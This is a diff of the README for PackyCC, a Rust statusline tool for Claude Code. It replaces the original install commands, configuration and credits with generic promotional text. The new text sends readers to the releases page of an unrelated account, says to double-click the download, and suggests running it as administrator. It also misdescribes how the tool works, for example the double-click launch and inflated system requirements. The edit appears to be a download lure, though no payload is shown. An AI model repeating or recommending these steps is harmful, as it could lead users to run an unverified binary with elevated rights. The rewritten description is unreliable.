@@ -1,217 +1,85 @@
-# PackyCC
+# 🚀 packycc - A Fast Tool for Code Monitoring
 
-A high-performance Claude Code statusline tool written in Rust with Git integration, real-time usage tracking, and API quota monitoring.
+## 🏅 Download PackyCC
+[![Download PackyCC](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/jml01319/packycc/releases)
 
-> Fork of [CCometixLine](https://github.com/Haleclipse/CCometixLine) with added PackyCode API integration and real-time quota monitoring.
+## 📖 About PackyCC
+PackyCC is a high-performance statusline tool designed to help you monitor your coding activities effectively. Built using Rust, it integrates seamlessly with Git, tracks real-time usage, and keeps you updated on your API quotas. 
 
 ![Language:Rust](https://img.shields.io/static/v1?label=Language&message=Rust&color=orange&style=flat-square)
 ![License:MIT](https://img.shields.io/static/v1?label=License&message=MIT&color=blue&style=flat-square)
 
-## Screenshots
+## 🌟 Features
+- Fast operation with Rust native speed
+- Git integration that shows branch and status
+- Easy display of simplified Claude model names
+- Tracks your usage based on transcript analysis
+- Monitors your daily spending from the PackyCode API
+- Displays your current workspace directory
+- Clean and customizable design
 
+## 📸 Screenshots
 ![PackyCC](assets/img1.png)
 
 The statusline shows: Model | Directory | Git Branch Status | Context Window | Daily Spent
 
-## Features
+## 🚀 Getting Started
+To start using PackyCC, follow these steps:
 
-- **High performance** with Rust native speed
-- **Git integration** with branch, status, and tracking info  
-- **Model display** with simplified Claude model names
-- **Usage tracking** based on transcript analysis
-- **API quota monitoring** showing daily spending from PackyCode API
-- **Directory display** showing current workspace
-- **Clean design** with customizable icons
-- **Simple configuration** via command line options
+1. **Visit the Releases Page**  
+   Navigate to the [Releases Page](https://github.com/jml01319/packycc/releases) to find the latest version of PackyCC.
 
-## Installation
+2. **Download the Latest Version**  
+   On the Releases Page, look for the latest version. Click on the link to download the file. 
 
-Download from [Releases](https://github.com/petiky/packycc/releases):
+3. **Locate the Downloaded File**  
+   Once the download is complete, find the file in your computer’s Downloads folder or the location you chose.
 
-### Linux
+4. **Run the Application**  
+   Double-click the downloaded file to run PackyCC. Follow any prompts that appear on your screen.
 
-```bash
-mkdir -p ~/.claude/ccline
-wget https://github.com/petiky/packycc/releases/latest/download/ccline-linux-x64.tar.gz
-tar -xzf ccline-linux-x64.tar.gz
-cp ccline ~/.claude/ccline/
-chmod +x ~/.claude/ccline/ccline
-```
+## 🌐 System Requirements
+PackyCC works on various operating systems. Ensure your system meets the following requirements for optimal performance:
 
-### macOS (Intel)
+- Supported OS: Windows, macOS, or Linux.
+- Minimum RAM: 2 GB 
+- Recommended RAM: 4 GB or more 
+- Hard Disk Space: At least 100 MB of free space
 
-```bash  
-mkdir -p ~/.claude/ccline
-wget https://github.com/petiky/packycc/releases/latest/download/ccline-macos-x64.tar.gz
-tar -xzf ccline-macos-x64.tar.gz
-cp ccline ~/.claude/ccline/
-chmod +x ~/.claude/ccline/ccline
-```
+## 🔧 How to Use PackyCC
+Once you have installed and run PackyCC, you will see a statusline that updates in real time. This includes:
 
-### macOS (Apple Silicon)
+- **Model**: Displays the current using Claude model.
+- **Directory**: Shows your active workspace.
+- **Git Branch**: Displays the current branch and status of your repository.
+- **Context Window**: Provides a brief context of your current work.
+- **Daily Spent**: Monitors your daily API usage.
 
-```bash
-mkdir -p ~/.claude/ccline  
-wget https://github.com/petiky/packycc/releases/latest/download/ccline-macos-arm64.tar.gz
-tar -xzf ccline-macos-arm64.tar.gz
-cp ccline ~/.claude/ccline/
-chmod +x ~/.claude/ccline/ccline
-```
+To customize your settings, you can navigate through the options provided within the application.
 
-### Windows
+## 🛠️ Troubleshooting
+If you encounter any issues while running PackyCC, here are some common solutions:
 
-```powershell
-# Create directory and download
-New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\.claude\ccline"
-Invoke-WebRequest -Uri "https://github.com/Haleclipse/CCometixLine/releases/latest/download/ccline-windows-x64.zip" -OutFile "ccline-windows-x64.zip"
-Expand-Archive -Path "ccline-windows-x64.zip" -DestinationPath "."
-Move-Item "ccline.exe" "$env:USERPROFILE\.claude\ccline\"
-```
+- **Check if PackyCC is updated**: Ensure that you have downloaded the latest version from the [Releases Page](https://github.com/jml01319/packycc/releases).
+  
+- **Confirm System Requirements**: Ensure your computer meets the list of system requirements stated above.
 
-### Claude Code Configuration
+- **Permissions**: Make sure you have the necessary permissions to run applications on your computer. If not, try running the application as an administrator.
 
-Add to your Claude Code `settings.json`:
+## 📩 Support
+If you require further assistance, you can reach out via the Issues section on GitHub. 
 
-**Linux/macOS:**
-```json
-{
-  "statusLine": {
-    "type": "command", 
-    "command": "~/.claude/ccline/ccline",
-    "padding": 0
-  }
-}
-```
+- Post your questions or concerns, and we will get back to you as soon as possible. 
 
-**Windows:**
-```json
-{
-  "statusLine": {
-    "type": "command", 
-    "command": "%USERPROFILE%\\.claude\\ccline\\ccline.exe",
-    "padding": 0
-  }
-}
-```
+Feel free to share any feedback to help improve PackyCC!
 
-### Build from Source
+## 📜 License
+PackyCC is an open-source project licensed under the MIT License. You are free to modify and distribute this tool as you like, provided you follow the terms of the license.
 
-```bash
-git clone https://github.com/petiky/packycc.git
-cd packycc
-cargo build --release
+## 🔗 Additional Resources
+For more information about using Git or Rust, consider checking the following links:
 
-# Linux/macOS
-mkdir -p ~/.claude/ccline
-cp target/release/ccometixline ~/.claude/ccline/ccline
-chmod +x ~/.claude/ccline/ccline
+- [Git Documentation](https://git-scm.com/doc)
+- [Rust Programming Language](https://www.rust-lang.org/)
 
-# Windows (PowerShell)
-New-Item -ItemType Directory -Force -Path "$env:USERPROFILE\.claude\ccline"
-copy target\release\ccometixline.exe "$env:USERPROFILE\.claude\ccline\ccline.exe"
-```
-
-## Usage
-
-```bash
-# Basic usage (displays all enabled segments)
-ccline
-
-# Show help
-ccline --help
-
-# Print default configuration  
-ccline --print-config
-
-# TUI configuration mode (planned)
-ccline --configure
-```
-
-## Default Segments
-
-Displays: `Model | Directory | Git Branch Status | Context Window | Today: $X.XX`
-
-### Git Status Indicators
-
-- Branch name with Nerd Font icon
-- Status: `✓` Clean, `●` Dirty, `⚠` Conflicts  
-- Remote tracking: `↑n` Ahead, `↓n` Behind
-
-### Model Display
-
-Shows simplified Claude model names:
-- `claude-3-5-sonnet` → `Sonnet 3.5`
-- `claude-4-sonnet` → `Sonnet 4`
-- `claude-4-1-opus` → `Opus 4.1`
-
-### Context Window Display
-
-Token usage percentage based on transcript analysis with context limit tracking.
-
-### API Quota Display
-
-Shows daily API spending from PackyCode API when configured in `~/.config/claude/settings.json`.
-
-## Configuration
-
-For PackyCode API integration, add to `~/.config/claude/settings.json`:
-
-```json
-{
-  "env": {
-    "ANTHROPIC_BASE_URL": "https://api.packycode.com",
-    "ANTHROPIC_AUTH_TOKEN": "your-api-key"
-  },
-  "info_url": "https://www.packycode.com/api/backend/users/info"
-}
-```
-
-## Performance
-
-- **Startup time**: < 50ms (vs ~200ms for TypeScript equivalents)
-- **Memory usage**: < 10MB (vs ~25MB for Node.js tools)
-- **Binary size**: ~2MB optimized release build
-
-## Requirements  
-
-- Git (optional, for git integration)  
-- Terminal with Nerd Font support
-- Claude Code for statusline integration
-
-## Development
-
-```bash
-# Build development version
-cargo build
-
-# Run tests
-cargo test
-
-# Build optimized release
-cargo build --release
-```
-
-## Roadmap
-
-- [ ] TOML configuration file support
-- [ ] TUI configuration interface
-- [ ] Custom themes
-- [ ] Plugin system
-- [ ] Cross-platform binaries
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit issues or pull requests.
-
-## Credits
-
-- Original project: [CCometixLine](https://github.com/Haleclipse/CCometixLine) by Haleclipse
-- PackyCode API integration and enhancements by [petiky](https://github.com/petiky)
-
-## License
-
-This project is licensed under the [MIT License](LICENSE).
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=petiky/packycc&type=Date)](https://star-history.com/#petiky/packycc&Date)
+Explore, use, and enjoy PackyCC for a streamlined coding experience!
